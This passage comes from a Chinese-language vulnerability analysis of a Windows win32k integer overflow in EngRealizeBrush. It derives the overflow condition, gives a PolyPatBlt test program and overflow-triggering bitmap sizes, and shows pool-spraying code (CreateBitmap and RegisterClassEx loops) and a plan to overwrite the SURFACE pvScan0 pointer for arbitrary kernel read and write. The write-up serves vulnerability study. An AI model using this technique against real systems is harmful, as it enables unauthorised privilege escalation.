这样总结一下就可以得到ulSizeTotal最终的流程图。也就是说如果要控制ulSizeTotal的大小就要从以下几个方面着手。<br><strong>①、SURFOBJ a4的宽和高<br>
②、SURFOBJ a4的高<br>
③、SURFOBJ a2的iBitmapFormat</strong>

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01f475b48e7bab85cf.png)

### <a class="reference-link" name="3.2%20PALLOCMEM%E4%B9%8Bsize%E5%8F%82%E6%95%B0%E9%AA%8C%E8%AF%81"></a>3.2 PALLOCMEM之size参数验证

经过上一节的静态分析之后，可以知道size的由来，在这一节。通过动态调试来进行验证。

虽然通过以上分析得到很多信息了，但是有些关键信息，比如v8最终值是什么，以及为了提权，如何通过一个ring3的函数进入到ring0也是一个很关键的问题。<br>
理论上通过在EngRealizeBrush的PALLOCMEM处下一个断点，然后用windbg跑起来就能得到函数调用栈。在此之前得编写验证代码。

通过运行小刀师傅写的POC程序。也是断在EngRealizeBrush的PALLOCMEM处。查看函数调用，发现由用户态进入内核态的调用者是 PolyPatBlt 函数，那么接下来就尝试通过函数 PolyPatBlt 作为切入点进行分析。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01f558e3bcc32498b2.png)

该函数是 gdi32.dll 模块的导出函数，但并未被微软文档化，仅作为系统内部调用使用。通过小刀师傅的博客可以得到函数PolyPatBlt原型（详细可参考上文），以及其中比较重要的第三个参数pPoly。根据偏移可将pPoly定义为结构PATRECT，PATRECT具体内容也可参照上文。<br>
因为不需要DC 对象选择笔刷对象，只需将笔刷对象的句柄放置在数组元素的成员域 hBrush 即可。因为函数 PolyPatBlt 并未文档化，需要通过 GetProcAddress 动态获取地址的方式引用。有个上述这些知识就可以编写测试代码（memorytest，这个代码主要是为了来证明上述静态分析的结果，也就是对于分配内存大小的计算）

```
// memorytest.cpp : 定义控制台应用程序的入口点。
//

#include &lt;stdio.h&gt;
#include &lt;tchar.h&gt;
#include &lt;Windows.h&gt;
#include &lt;wingdi.h&gt;
#include &lt;iostream&gt;
#include &lt;Psapi.h&gt;
#pragma comment(lib, "psapi.lib")
typedef BOOL (WINAPI *PFN_PolyPatBlt)(
    HDC hdc,
    DWORD rop,
    PVOID pPoly,
    DWORD Count,
    DWORD Mode
);
PFN_PolyPatBlt PfnPolyPatBlt = NULL;
typedef struct _PATRECT `{`
    INT nXLeft;
    INT nYLeft;
    INT nWidth;
    INT nHeight;
    HBRUSH hBrush;
`}` PATRECT, *PPATRECT;
void Test()
`{`
    //获取当前桌面设备上下文的DC对象句柄
    HDC hdc = GetDC(NULL);
    //创建位图，宽为0x12，高为0x123，色平面数为1，用一位表示一个像素
    HBITMAP hbmp = CreateBitmap(0x12, 0x123, 1, 1, NULL);
    //通过hbmp这个位图对象获取BRUSH对象
    HBRUSH hbru = CreatePatternBrush(hbmp);
    //通过 GetProcAddress 动态获取gdi32的地址
    PfnPolyPatBlt = (PFN_PolyPatBlt)GetProcAddress(GetModuleHandleA("gdi32"), "PolyPatBlt");
    //对PATRECT结构中的成员变量进行赋值
    PATRECT ppb[1] = `{` 0 `}`;
    ppb[0].nXLeft = 0x100;
    ppb[0].nYLeft = 0x100;
    ppb[0].nWidth = 0x100;
    ppb[0].nHeight = 0x100;
    ppb[0].hBrush = hbru;
    PfnPolyPatBlt(hdc, PATCOPY, ppb, 1, 0);
`}`
int _tmain(int argc, _TCHAR* argv[])
`{`
    Test();
    return 0;
`}`
```

用windbg查看引用过程并且验证申请的空间是否和静态分析的结果一致。（这里调试的程序是验证代码memorytext.exe）

首先在EngRealizeBrush 和EngRealizeBrush +0x19c处下一个断点。至于为什么要在偏移0x19c这里下断点就是因为这是PALLOCMEM的位置

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01638653fab2cbe695.png)

断在EngRealizeBrush 之后可以查看这个函数的四个参数，可以发现a4为0

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01fc65622ca08f49a5.png)

通过上文的静态分析可以知道，如果a4为0，那么后半部分的ulSizeTotal是不需要考虑的

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t010f5eb552aca57509.png)

所以只需要考虑前半部分，而通过上文的静态分析可以知道，前半部分只跟a2的iBitmapFormat的值和a3位图的高度有关

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t012ab8afc3758675c3.png)

通过SURFOBJ的数据结构偏移，利用windbg查看数据就可以知道相关数据的值了

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01b49e448e1da9048e.png)

根据之前的分析a2-&gt;iBitmapFormat=6（BMF_32BPP），所以v11=32。而静态分析可以知道v8就是等于a3-&gt;Size-&gt;cx。为0x12。当然也可以通过动态调试的方法查看。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t015e12a50a4232976b.png)

对应的汇编代码偏移为0x10A

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0102b52f2d38518385.png)

在windbg下断点，查看寄存器的值，因为v8储存在edi中，可以发现此时v8确实就是0x12

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01736d457dc44f6579.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0195a16b2c39d178ee.png)

此次为了计算ulSizeTotal的全部条件都有了，那么带入公式中计算一下结果，得到结果为0x521c。之后再算上分配的时候加上的64那么就是0x525c了

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t019db890d28104ade6.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0133a0818917e28899.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0118aa40413d3ee159.png)

接下来就是要看看实际上程序到底申请了多少空间，需要跟到0x19c的位置，这里显示的是只有0x525c的空间。和计算的结果相符所以上面的静态分析是没有错的

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01f77e283455d13f12.png)

还有有一个小要点就是为什么iBitmapFormat是BMF_32BPP，主要是跟电脑的配置有关

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t016adcc9dd6af07733.png)

总结一下，分配的空间<strong>BufferSize =<br>
`{`[(a2-&gt;iBitmapFormat)**(a3-&gt;Size-&gt;c_x)]&gt;&gt;3`}`**(a3-&gt;Size-&gt;c_y)+0x44+0x40</strong><br>
其中a2-&gt;iBitmapFormat与电脑设置有关，这里就为0x20了。<br>
所以整理一下**BufferSize = 4**(a3-&gt;Size-&gt;c_x)**(a3-&gt;Size-&gt;c_y)+0x84**。<br>
那么因为BufferSize在这里是PALLOCMEM的第一个参数，这个参数是unsigned int，也就是32位，如果想要溢出的话，那么就要<br>**4**(a3-&gt;Size-&gt;c_x)**(a3-&gt;Size-&gt;c_y)+0x84 &gt; 0xFFFFFFFF + 1 + 1**<br>
（0xFFFFFFFF + 1代表溢出为0x100000000，再加1是因为分配的内存肯定要大于1）。<br>
整理以下得到：**(a3-&gt;Size-&gt;c_x)*(a3-&gt;Size-&gt;c_y) &gt; 0x3FFFFFE0**。

接下来的问题就是要如何设置(a3-&gt;Size-&gt;c_x)和(a3-&gt;Size-&gt;c_y)使得达到最终的提权的目的。<br>
当前在提权之前还有几步要走：<br>
1、理清漏洞函数的前后逻辑关系。<br>
2、测试随意分配内存会造成什么后果（BOSD等）<br>
3、如何利用使得能够提权

### <a class="reference-link" name="3.3%20EngRealizeBrush%E5%89%8D%E5%90%8E%E5%87%BD%E6%95%B0%E9%80%BB%E8%BE%91%E5%85%B3%E7%B3%BB"></a>3.3 EngRealizeBrush前后函数逻辑关系

在IDA中查看EngRealizeBrush的交叉引用，发现最后一条的与上面都不一样

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01821284c52cf78c8e.png)

跟进去之后可以发现对EngRealizeBrush的调用，它是作为bGetRealizedBrush第三个参数。这个函数的流程还是比较清楚的。唯一有点问题的就是这里结构的处理。程序逻辑：首先判断传进来的a1这个BRUSHOBJ偏移0x14是不是为空，如果为空，那么就会调用bGetRealizedBrush。第一个参数就是a1偏移0x48，第二个参数是a1，第三个参数是EngRealizeBrush函数地址。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t013b16ddea4f9e8df1.png)

但是如果查看BRUSHOBJ数据结构，发现这个数据结构的大小并没有这么大，但是另一个EBRUSHOBJ的数据结构倒是符合这里的要求

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01f4c4c92d32fb550c.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01653d782a60363698.png)

所以这里函数逻辑应该就是判断参数a1-&gt;pengbrush是否为空，如果为空则会调用bGetRealizedBrush且第一个参数为a1-&gt;pbrush，如果bGetRealizedBrush返回失败则会调用ExFreePoolWithTag释放a1-&gt;pengbrush。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01bbce8a0f0c23ba22.png)

接着观察EngRealizeBrush的PALLOCMEM后部分的代码。分配完空间后就是一波赋值，标红框的是因为SURFMEM::bCreateDIB将会用到它

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0150d16fa7504c141f.png)

SURFMEMOBJ::bCreateDIB 传入前面分配的缓冲区 0x40 字节偏移地址作为独立的位图像素数据区域参数 pvBitsIn 来创建新的设备无关位图对象。新创建的设备无关位图对象的像素位数格式与参数 psoTarget 指向的目标位图 SURFOBJ 对象的成员域 iBitmapFormat 一致。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t019d4e8fdf097c7ff3.png)

进入到bCreateDIB函数中发现，其中有一些case判断，如果满足条件则会返回0，并且这些判断的对象都是一样的**((_DWORD **)a2 + 1)。这些是判断创建的位图是否超过范围，如果超过那么就返回0。

[![](https://p4.ssl.qhimg.com/t019a7eaf2de1f8d154.png)](https://p4.ssl.qhimg.com/t019a7eaf2de1f8d154.png)

那么bCreateDIB返回0会造成什么后果呢？回到EngRealizeBrush对bCreateDIB后续部分进行分析。失败之后会跳到LABEL_47，释放SURFMEM之后跳到LABEL，释放HTSEMOBJ之后返回0。

[![](https://p2.ssl.qhimg.com/t01a31a4d3e8a4563e8.png)](https://p2.ssl.qhimg.com/t01a31a4d3e8a4563e8.png)

[![](https://p0.ssl.qhimg.com/t010df36f78b4674b78.png)](https://p0.ssl.qhimg.com/t010df36f78b4674b78.png)

[![](https://p5.ssl.qhimg.com/t01aa3573b3cb5b1c5c.png)](https://p5.ssl.qhimg.com/t01aa3573b3cb5b1c5c.png)

那返回失败有什么后果呢？在之前已经用交叉引用往上找到返回失败的后果就是释放分配的空间

[![](https://p4.ssl.qhimg.com/t01711cb48f996ee6eb.png)](https://p4.ssl.qhimg.com/t01711cb48f996ee6eb.png)

分析到这里可以实际测试一下，这里为了让其溢出，设置的位图宽为0x36D，高为0x12AE8F，这样根据公式：4**(a3-&gt;Size-&gt;c_x)**(a3-&gt;Size-&gt;c_y)+0x84算出BufferSize=0x1 0000 0010，由于溢出最后截取到的结果就是0x10。<br>
这里可以使用刚才的测试代码进行些许修改，调试一下看看内存发生了什么变化

[![](https://p3.ssl.qhimg.com/t01c5d09f070bc13428.png)](https://p3.ssl.qhimg.com/t01c5d09f070bc13428.png)

运行之后发现虚拟机崩溃了，查看错误原因发现是bad_pool_header，说明这样分配确实会导致内存中的某些部分被破坏。仔细分析一下可以知道由于整数溢出导致后续代码逻辑触发缓冲区溢出漏洞，覆盖了下一个内存块的 POOL_HEADER 内存块头部结构，在函数 ExFreePoolWithTag 中释放当前内存块时，校验同一内存页中的下一个内存块的有效性；没有校验通过则抛出异常码为 BAD_POOL_HEADER 的异常。

[![](https://p4.ssl.qhimg.com/t01e9c1de83fbeed0df.png)](https://p4.ssl.qhimg.com/t01e9c1de83fbeed0df.png)

[![](https://p3.ssl.qhimg.com/t01bb28ac4fcfb89e19.png)](https://p3.ssl.qhimg.com/t01bb28ac4fcfb89e19.png)

在上面验证代码中使用到CreatePatternBrush。实际上这个函数用的是内核函数NtGdiCreatePatternBrushInternal 再跟进去之后发现，它调用的是内核函数GreCreatePatternBrushInternal函数

[![](https://p5.ssl.qhimg.com/t01939b43e5062fb2ef.png)](https://p5.ssl.qhimg.com/t01939b43e5062fb2ef.png)

跟进GreCreatePatternBrushInternal，第一个参数是传递位图的句柄，后两个参数为0，暂时不用管。SURFREF::SURFREF将传入的句柄参数(a1)转变为SURFACE对象。随后通过调用函数 hbmCreateClone 并传入图案位图的 SURFACE 对象指针以获得位图对象克隆实例的句柄。后面两个参数代表位图的宽和高

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01c0615b9f04bed34f.png)

跟进hbmCreateClone 可以发现函数将SURFACE结构中的部分值赋给了DEVBITMAPINFO结构中的成员变量，这里命名为dbmi

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01523824cf89433ac4.png)

接着函数会调用SURFMEM::bCreateDIB来构造新的设备无关位图的内存对象，参数有dbmi的首地址，这里就是v12

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t011168315e3957fefc.png)

接着hbmCreateClone 函数判断原位图 SURFACE 对象的调色盘是否属于单色模式

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t019facd885aa342ad2.png)

接着就会调用BRUSHMEMOBJ::BRUSHMEMOBJ，在这里这个函数的功能是初始化位于栈上的从变量 v9 地址起始的静态 BRUSHMEMOBJ 对象。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t018132d0ff16bde773.png)

跟进去之后发现，通过调用成员函数 BRUSHMEMOBJ::pbrAllocBrush 分配 BRUSH 对象内存，接下来对BRUSH对象的各个成员域进行初始化赋值。其中，通过第 2 个和第 3 个参数传入的位图对象克隆句柄和原位图对象句柄被分别存储在新分配的 BRUSH 对象的 +0x14 和 +0x18 字节偏移的成员域中。在这里需要留意 BRUSH 对象 +0x10 字节偏移的成员域赋值为 0xD 数值，该成员用于描述当前 BRUSH 对象的样式，数值 0xD 表示这是一个图案笔刷。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t016631e8907574550f.png)

在构造函数 BRUSHMEMOBJ::BRUSHMEMOBJ 返回后，函数<br>
GreCreatePatternBrushInternal 将刚才新创建的 BRUSH 对象的句柄成员的值作为返回值返回，该句柄值最终将返回到用户进程的调用函数中

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01b480768c8dda9fc9.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01802912723e224cae.png)

### <a class="reference-link" name="3.4%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80%E5%88%86%E6%9E%90"></a>3.4内存布局分析

结合Windows 内存页的相关知识接下来就要在内存层面了解一下如何构造POC。由先验知识可以知道，如果该池内存块位于所在的内存页的末尾，那么在这次 ExFreePoolWithTag 函数调用期间将不会对相邻内存块进行这个校验。再看一下下面这个图，这也是利用的关键之处

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01d90b0126a47d0536.png)

为了达到这个目的就需要在内核中通过相关 API 分配大量特定大小的内存块以占用对应内存页的起始位置，这部分就可以使用验证代码中提到过的CreateBitmap来实现。因为我们知道内存页的大小就是0x1000，根据上面的宽和高得到的内存空间是0x10，之后再算上被破坏的POOL_HEADER（0x8），那么一共可利用的空间就是0x18，也就是说需要使用CreateBitmap创造出0xFE8(0x1000-0x18)的空间。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01f169bb4267f8c6b8.png)

调用CreateBitmap函数时，系统最终在内核函数 SURFMEM::bCreateDIB 中分配内存缓冲区并初始化位图 SURFACE 对象和位图像素数据区域。当位图 SURFACE 对象的总大小在 0x1000 字节之内的话，分配内存时，将分配对应位图像素数据大小加 SURFACE 管理对象大小的缓冲区，直接以对应的 SURFACE 管理对象作为缓冲区头部，位图像素数据紧随其后存储。在当前系统环境下，SURFACE 对象的大小为 0x154 字节，在加上当前页的POOL_HEADER不能被破坏。那么通过CreateBitmap创建的空间大小就是0xE8C

```
0xFE8 - 8 - 0x154 = 0xE8C
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t010ba65958d2817367.png)

目前知道一共需要提前分配0xE8C的空间，而且使用的是CreateBitmap的方法，那到底要如何传参才能符合空间要求呢？根据上文中CreateBitmap的前提知识可以知道：因为0xE8C是4的倍数，那么为了方便计算可以直接传入像素位数格式为8，高度为1，这样就可以直接创建出0xE8C大小的位图

```
for (LONG i = 0; i &lt; 2000; i++)
`{`
    hbitmap[i] = CreateBitmap(0xE8C, 0x01, 1, 8, NULL);
`}`
```

现在已经有方法能够填充完一个一个内存页了，但是还有一个问题就是，如何能够指定0x18的数据写在填充后的内存页中。也就是说，系统中可能存在很多的0x18大小的内存空隙，我们并不能保证我们的代码能够写到指定的地方。为了解决这个问题，需要提前填充好已经存在的0x18字节的内存空隙。<br>
在这里作者使用的是RegisterClassEx这个注册窗口类来实现填充的。参数使用2~5个字符长度的字符串来实现。

```
CHAR buf[0x10] = `{` 0 `}`;
for (LONG i = 0; i &lt; 3000; i++)
`{`
    WNDCLASSEXA Class = `{` 0 `}`;
    sprintf(buf, "CLS_%d", i);
    Class.lpfnWndProc = DefWindowProcA;
    Class.lpszClassName = buf;
    Class.lpszMenuName = "Test";
    Class.cbSize = sizeof(WNDCLASSEXA);
    RegisterClassExA(&amp;Class);
`}`
```

到了这个阶段已经将空余的空间都填充干净了，现在就可以分析内存布局了。我们知道通过整数溢出分配给ENGBRUSH的空间为0x10。也就是说后面的初始化只有前0x10的赋值是合法的，后面的赋值都是非法的。

[![](https://p3.ssl.qhimg.com/t01f39dbdb0f5a66d40.png)](https://p3.ssl.qhimg.com/t01f39dbdb0f5a66d40.png)

这样子如果在ENGBRUSH内存块之后的内存块存放的是SURFACE的内存块，根据SURFACE数据结构可以得到如下的内存布局

[![](https://p3.ssl.qhimg.com/t01f375cd8a19aea3e7.png)](https://p3.ssl.qhimg.com/t01f375cd8a19aea3e7.png)

[![](https://p1.ssl.qhimg.com/t01f581cb0efbf89cbf.png)](https://p1.ssl.qhimg.com/t01f581cb0efbf89cbf.png)

注意到上图中，ENGBRUSH-&gt;iBitmapFormat将会覆盖到SURFACE的sizeLBitmap.cy。而这有什么用呢？回忆一下iBitmapFormat代表的是一个像素用几位二进制数表示，一般来说是根据电脑的配置来决定的，在这里是BMF_32BPP也就是值为6，而sizeLBitmap.cy是位图的高度。<br>
根据这个可以进行如下利用：**比如创建一个图，传入的宽度参数小于6，这样覆盖之后宽度就会被置为6，也就是原有创建的位图可控制的像素数据区域超过了其原有的范围，也就是可以操作下一内存页中相同位置的位图 SURFACE 对象的成员区域**。<br>
现在能够做到的操作就是对下一个内存页的SURFACE对象的成员进行操作。那么为了达成任意地址写的目的，可以将当前位图 SURFACE 对象作为主控位图对象，通过其对位于下一内存页中的位图 SURFACE 对象进行操作，将其作为扩展位图 SURFACE 对象，**覆盖其SURFACE-&gt;surfobj-&gt;pvScan0 指针为我们想读写的地址，随后再通过 SetBitmapBits 函数操作扩展位图 SURFACE 对象**，实现“指哪打哪”的目的。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t015d6b2162e041976a.png)

### <a class="reference-link" name="3.5%20%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80"></a>3.5 内存布局

以下会介绍两种内存布局，经过实践都可行。之所以会介绍两种内存布局是因为其中一种使用到了调色板（Palettes）这个类，但是能力有限，看的不是很懂，后来发现一个大佬使用的都是Bitmap类进行内存布局，所以在后续的调试中也是使用这样的思路。但是原理都一样，都是好方法。

